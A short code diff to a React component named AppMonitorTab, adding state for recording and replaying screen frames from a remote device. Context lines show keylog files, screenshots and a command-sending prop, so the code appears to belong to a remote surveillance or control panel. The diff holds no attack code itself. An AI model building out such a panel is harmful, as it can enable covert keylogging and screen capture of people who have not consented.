@@ -75,6 +75,16 @@ export default function AppMonitorTab({ device, sendCommand, results, screenRead
   const [keylogFiles, setKeylogFiles]     = useState([]);
   const [loadingScreenshot, setLoadingScreenshot] = useState(null);
   const [previewImage, setPreviewImage]   = useState(null);
+
+  const [isRecording, setIsRecording]     = useState(false);
+  const [readerActive, setReaderActive]   = useState(false);
+  const [currentFrames, setCurrentFrames] = useState([]);
+  const [recordings, setRecordings]       = useState([]);
+  const [isPlaying, setIsPlaying]         = useState(false);
+  const [playing, setPlaying]             = useState(null);
+  const [playIdx, setPlayIdx]             = useState(0);
+  const [playSpeed, setPlaySpeed]         = useState(1000);
+
   const seenIds = useRef(new Set());
 
   const [showAddAppModal, setShowAddAppModal] = useState(false);
